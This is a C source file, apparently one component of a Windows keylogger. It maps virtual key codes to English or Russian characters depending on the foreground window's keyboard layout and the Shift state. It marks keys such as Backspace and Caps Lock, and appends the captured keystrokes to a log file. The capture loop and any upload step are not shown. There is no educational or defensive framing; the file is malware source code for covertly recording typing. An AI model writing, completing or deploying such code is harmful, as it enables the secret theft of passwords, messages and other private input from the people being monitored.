#include <stdio.h>

#include "key.h"

bool is_key_ru(void){
    HKL keyboard = GetKeyboardLayout(GetWindowThreadProcessId(GetForegroundWindow(), 0));
    if(HIWORD(keyboard) == RU)
        return true;
    return false;
}

void save_file(const char *filename, const char *key){
    FILE *file = NULL;
    if((file = fopen(filename, "a")) != NULL){
        fprintf(file, "%s", key);
        fclose(file);
    }
}

const char* key_value(const int code){
	bool is_shift = false;
	is_shift = (GetAsyncKeyState(VK_SHIFT) & 0x8000) != 0;
    switch(code){
        case VK_A :
            if(is_key_ru() == true){
                if(is_shift)
                    return "Ф";
                else
                    return "ф";
            }
            else if(is_shift)
                return "A";
            else
                return "a";
        case VK_B :
            if(is_key_ru()){
                if(is_shift)
                    return "И";
                else
                    return "и";
            }
            else if(is_shift)
                return "B";
            else
                return "b";
        case VK_C :
			if(is_key_ru()){
                if(is_shift)
                    return "С";
                else
                    return "с";
            }
            else if(is_shift)
                return "C";
            else
                return "c";
        case VK_D :
            if(is_key_ru()){
                if(is_shift)
                    return "В";
                else
                    return "в";
            }
            else if(is_shift)
                return "D";
            else
                return "d";
        case VK_E :
            if(is_key_ru()){
                if(is_shift)
                    return "У";
                else
                    return "у";
            }
            else if(is_shift)
                return "E";
            else
                return "e";
        case VK_F :
            if(is_key_ru()){
                if(is_shift)
                    return "А";
                else
                    return "а";
            }
            else if(is_shift)
                return "F";
            else
                return "f";
        case VK_G :
            if(is_key_ru()){
                if(is_shift)
                    return "П";
                else
                    return "п";
            }
            else if(is_shift)
                return "G";
            else
                return "g";
        case VK_H :
            if(is_key_ru()){
                if(is_shift)
                    return "Р";
                else
                    return "р";
            }
            else if(is_shift)
                return "H";
            else
                return "h";
        case VK_I :
            if(is_key_ru()){
                if(is_shift)
                    return "Ш";
                else
                    return "ш";
            }
            else if(is_shift)
                return "I";
            else
                return "i";
        case VK_J :
            if(is_key_ru()){
                if(is_shift)
                    return "О";
                else
                    return "о";
            }
            else if(is_shift)
                return "J";
            else
                return "j";
        case VK_K :
            if(is_key_ru()){
                if(is_shift)
                    return "Л";
                else
                    return "л";
            }
            else if(is_shift)
                return "K";
            else
                return "k";
        case VK_L :
            if(is_key_ru()){
                if(is_shift)
                    return "Д";
                else
                    return "д";
            }
            else if(is_shift)
                return "L";
            else
                return "l";
        case VK_M :
            if(is_key_ru()){
                if(is_shift)
                    return "Ь";
                else
                    return "ь";
            }
            else if(is_shift)
                return "M";
            else
                return "m";
        case VK_N :
            if(is_key_ru()){
                if(is_shift)
                    return "Т";
                else
                    return "т";
            }
            else if(is_shift)
                return "N";
            else
                return "n";
        case VK_O :
            if(is_key_ru()){
                if(is_shift)
                    return "Щ";
                else
                    return "щ";
            }
            else if(is_shift)
                return "O";
            else
                return "o";
        case VK_P :
            if(is_key_ru()){
                if(is_shift)
                    return "З";
                else
                    return "з";
            }
            else if(is_shift)
                return "P";
            else
                return "p";
        case VK_Q :
            if(is_key_ru()){
                if(is_shift)
                    return "Й";
                else
                    return "й";
            }
            else if(is_shift)
                return "Q";
            else
                return "q";
        case VK_R :
            if(is_key_ru()){
                if(is_shift)
                    return "К";
                else
                    return "к";
            }
            else if(is_shift)
                return "R";
            else
                return "r";
        case VK_S :
            if(is_key_ru()){
                if(is_shift)
                    return "Ы";
                else
                    return "ы";
            }
            else if(is_shift)
                return "S";
            else
                return "s";
        case VK_T :
            if(is_key_ru()){
                if(is_shift)
                    return "Е";
                else
                    return "е";
            }
            else if(is_shift)
                return "T";
            else
                return "t";
        case VK_U :
            if(is_key_ru()){
                if(is_shift)
                    return "Г";
                else
                    return "г";
            }
            else if(is_shift)
                return "U";
            else
                return "u";
        case VK_V :
            if(is_key_ru()){
                if(is_shift)
                    return "М";
                else
                    return "м";
            }
            else if(is_shift)
                return "V";
            else
                return "v";
        case VK_W :
            if(is_key_ru()){
                if(is_shift)
                    return "Ц";
                else
                    return "ц";
            }
            else if(is_shift)
                return "W";
            else
                return "w";
        case VK_X :
            if(is_key_ru()){
                if(is_shift)
                    return "Ч";
                else
                    return "ч";
            }
            else if(is_shift)
                return "X";
            else
                return "x";
        case VK_Y :
            if(is_key_ru()){
                if(is_shift)
                    return "Н";
                else
                    return "н";
            }
            else if(is_shift)
                return "Y";
            else
                return "y";
        case VK_Z :
            if(is_key_ru()){
                if(is_shift)
                    return "Я";
                else
                    return "я";
            }
            else if(is_shift)
                return "Z";
            else
                return "z";
        case VK_0 :
            if(is_shift)
                return ")";
            else
                return "0";
        case VK_1 :
            if(is_shift)
                return "!";
            else
                return "1";
        case VK_2 :
            if(is_shift)
                return "@";
            else
                return "2";
        case VK_3 :
            if(is_shift)
                return "#";
            else
                return "3";
        case VK_4 :
            if(is_shift)
                return "$";
            else
                return "4";
        case VK_5 :
            if(is_shift)
                return "%";
            else
                return "5";
        case VK_6 :
            if(is_shift)
                return "^";
            else
                return "6";
        case VK_7 :
            if(is_shift)
                return "&";
            else
                return "7";
        case VK_8 :
            if(is_shift)
                return "*";
            else
                return "8";
        case VK_9 :
            if(is_shift)
                return "(";
            else
                return "9";
        case VK_TILDE :
            if(is_shift)
                return "~";
            else
                return "`";
        case VK_DASH :
            if(is_shift)
                return "_";
            else
                return "-";
        case VK_EQ :
            if(is_shift)
                return "+";
            else
                return "=";
        case VK_LBRACKET :
            if(is_key_ru()){
                if(is_shift)
                    return "Х";
                else
                    return "х";
            }
            else if(is_shift)
                return "{";
            else
                return "[";
        case VK_RBRACKET :
            if(is_key_ru()){
                if(is_shift)
                    return "Ъ";
                else
                    return "ъ";
            }
            else if(is_shift)
                return "}";
            else
                return "]";
        case VK_DOT_COMMA :
            if(is_key_ru()){
                if(is_shift)
                    return "Ж";
                else
                    return "ж";
            }
            else if(is_shift)
                return ":";
            else
                return ";";
        case VK_APOSTROPHE :
            if(is_key_ru()){
                if(is_shift)
                    return "Э";
                else
                    return "э";
            }
            else if(is_shift)
                return "\"";
            else
                return "'";
        case VK_REV_SLASH :
            if(is_shift)
                return "|";
            else
                return "\\";
        case VK_COMMA :
            if(is_key_ru()){
                if(is_shift)
                    return "Б";
                else
                    return "б";
            }
            else if(is_shift)
                return "<";
            else
                return ",";
        case VK_DOT :
            if(is_key_ru()){
                if(is_shift)
                    return "Ю";
                else
                    return "ю";
            }
            else if(is_shift)
                return ">";
            else
                return ".";
        case VK_SLASH :
            if(is_shift)
                return "?";
            else
                return "/";
        case VK_NUMPAD0 :
            return "0";
        case VK_NUMPAD1 :
            return "1";
        case VK_NUMPAD2 :
            return "2";
        case VK_NUMPAD3 :
            return "3";
        case VK_NUMPAD4 :
            return "4";
        case VK_NUMPAD5 :
            return "5";
        case VK_NUMPAD6 :
            return "6";
        case VK_NUMPAD7 :
            return "7";
        case VK_NUMPAD8 :
            return "8";
        case VK_NUMPAD9 :
            return "9";
        case VK_MULTIPLY :
            return "*";
        case VK_ADD :
            return "+";
        case VK_SUBTRACT :
            return "-";
        case VK_DIVIDE :
            return "/";
        case VK_DECIMAL :
            return ".";
        case VK_SPACE :
            return " ";
        case VK_TAB :
            return "\t";
        case VK_CAPITAL :
            return "<CAPS LOCK>";
        case VK_RETURN :
            return "\n";
        case VK_BACK :
            return "<BACK SPACE>";
    }
	return "";
}
